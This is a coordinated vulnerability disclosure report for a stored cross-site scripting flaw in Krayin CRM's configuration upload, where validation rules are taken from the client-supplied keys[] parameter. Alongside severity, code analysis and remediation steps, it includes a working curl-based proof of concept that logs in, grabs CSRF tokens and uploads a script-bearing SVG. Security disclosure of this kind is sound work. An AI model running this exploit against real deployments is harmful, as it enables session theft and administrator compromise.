# Stored Cross-Site Scripting (XSS) via Client-Controlled Upload Validation in Configuration (Krayin CRM ≤ 2.2.5)

## Presentation

- **Security Vulnerability:** Stored Cross-Site Scripting (Stored XSS)
- **Vulnerability Type:** Cross-Site Scripting
- **CWE:** CWE-79 (Primary), CWE-602 (Root Cause), CWE-434 (Contributing)
- **CVE:** Pending
- **Affected Component:** Configuration Upload (`ConfigurationController::store()` / `ConfigurationForm`)
- **Software:** Krayin CRM
- **Affected Versions:** ≤ 2.2.5
- **Business Area:** Customer Relationship Management (CRM)
- **Submitter:** bl4dsc4n

---

## CVE Description

A stored cross-site scripting (XSS) vulnerability in the configuration upload functionality of Krayin CRM through version 2.2.5 allows an authenticated user with configuration-edit permissions to upload and store malicious SVG or arbitrary files by manipulating client-controlled validation rules. Because uploaded files are stored on the public disk and served from the application origin, an attacker can execute arbitrary JavaScript when the uploaded file is accessed.

---

## Summary

Krayin derives upload validation rules for configuration files (such as the administrative logo and favicon) from the client-supplied `keys[]` parameter instead of a trusted server-side definition.

An authenticated user with configuration-edit privileges can modify the validation rules to `nullable` (or omit them entirely), bypassing file-type restrictions and uploading arbitrary content. Additionally, the default allow-list already permits SVG files (`mimes:bmp,jpeg,jpg,png,webp,svg`).

Uploaded files are written to the public storage disk (`storage/app/public/configuration`) and exposed through the `/storage` path. Since SVG files are served with the `image/svg+xml` content type, embedded JavaScript executes in the application's origin whenever the uploaded file is opened.

---

## Severity

**High**

**CVSS v3.1:** `AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N` (**8.7**)

This issue results in Stored Cross-Site Scripting. The malicious payload is additionally accessible without authentication through its public `/storage` URL.

---

## Affected Versions

- Confirmed on **2.2.4**
- Confirmed on **2.2.5** (latest)

The vulnerable `ConfigurationForm` implementation is identical in both releases.

Although version 2.2.5 introduced a security fix that moved email attachments to a private storage disk, configuration uploads remain publicly accessible and continue to use client-controlled validation.

---

## Affected Component

**Request**

- `Webkul\Admin\Http\Requests\ConfigurationForm`
- Method: `rules()`

**Controller**

- `Webkul\Admin\Http\Controllers\Configuration\ConfigurationController`
- Method: `store()`

**Endpoint**

```
POST /admin/configuration/{group}/{section}
```

Example:

```
POST /admin/configuration/general/general
```

---

## Technical Details

`ConfigurationForm::rules()` constructs upload validation rules directly from the client-controlled `keys[]` parameter:

```php
return collect(request()->input('keys', []))->mapWithKeys(function ($item) {
    $data = json_decode($item, true);

    return collect($data['fields'])->mapWithKeys(function ($field) use ($data) {
        $key = $data['key'].'.'.$field['name'];

        $validation = $field['validation'] ?? 'nullable';

        return [$key => $validation];
    })->toArray();
})->toArray();
```

Because validation is entirely controlled by the request:

- the attacker can replace the upload rule with `nullable`;
- file-type restrictions can be bypassed;
- arbitrary file types may be uploaded.

Separately, the default validation already allows SVG uploads:

```
mimes:bmp,jpeg,jpg,png,webp,svg
```

`ConfigurationController::store()` subsequently processes the request using:

```php
configurationRepository->create(request()->all());
```

The uploaded file is stored in:

```
storage/app/public/configuration/
```

and becomes publicly accessible through:

```
/storage/configuration/<filename>
```

---

## Proof of Concept

Authenticate as a user with configuration-edit permission.

```bash
BASE=https://TARGET
CJ=$(mktemp)

LT=$(curl -s -c "$CJ" "$BASE/admin/login" \
 | grep -oE 'name="_token" value="[^"]+"' \
 | sed -E 's/.*value="([^"]+)".*/\1/')

curl -s -b "$CJ" -c "$CJ" \
  -X POST "$BASE/admin/login" \
  --data-urlencode "_token=$LT" \
  --data-urlencode "email=admin@example.com" \
  --data-urlencode "password=admin123"

XSRF=$(python3 -c "import urllib.parse,re;print(urllib.parse.unquote(re.search(r'XSRF-TOKEN\s+(\S+)',open('$CJ').read()).group(1)))")

printf '%s' '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>' > evil.svg

curl -s -b "$CJ" \
  -X POST "$BASE/admin/configuration/general/general" \
  -H "X-XSRF-TOKEN: $XSRF" \
  -F 'keys[]={"key":"general.general.admin_logo","fields":[{"name":"logo_image","validation":"nullable"},{"name":"favicon_image","validation":"nullable"}]}' \
  -F "general[general][admin_logo][logo_image]=@evil.svg;type=image/svg+xml"
```

### Observed Result

The uploaded SVG is stored successfully and becomes publicly accessible:

```
GET /storage/configuration/<random>.svg
```

Response:

- HTTP 200
- Content-Type: `image/svg+xml`
- Embedded `<script>` preserved

Opening the URL executes JavaScript in the application's origin.

Because `/storage` is publicly exposed, the payload can be accessed without authentication.

When validation is changed to `nullable`, arbitrary files (such as `.html`) may also be uploaded and served.

---

## Impact

Successful exploitation allows an authenticated attacker with configuration-edit permissions to perform Stored Cross-Site Scripting within the CRM application.

An attacker can:

- execute arbitrary JavaScript in the application's origin;
- steal authenticated sessions;
- steal CSRF tokens;
- perform actions on behalf of victims;
- compromise privileged administrator sessions;
- upload arbitrary file types by bypassing client-controlled validation;
- host malicious payloads that remain publicly accessible under `/storage`.

---

## Suggested Remediation

- Generate upload validation rules exclusively from trusted server-side configuration.
- Never derive validation rules from client-controlled parameters such as `keys[]`.
- Remove SVG from the allowed upload types or sanitize SVG content before storage.
- Validate uploaded files using MIME detection and file signatures instead of extensions alone.
- Store configuration uploads on a private storage disk.
- Serve uploaded files through a controller that enforces safe `Content-Type`, `Content-Disposition`, and an appropriate Content Security Policy (CSP).

---

## Weakness Classification

| Classification | Identifier |
|---------------|------------|
| Primary | CWE-79 – Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') |
| Root Cause | CWE-602 – Client-Side Enforcement of Server-Side Security |
| Contributing | CWE-434 – Unrestricted Upload of File with Dangerous Type |

**VulDB Classification**

- Cross Site Scripting

---

## Disclosure

This issue was reported privately under a coordinated vulnerability disclosure process.

Proof-of-concept, reproduction steps, and version verification are available upon request.

Please credit the reporter and request a CVE identifier if applicable.
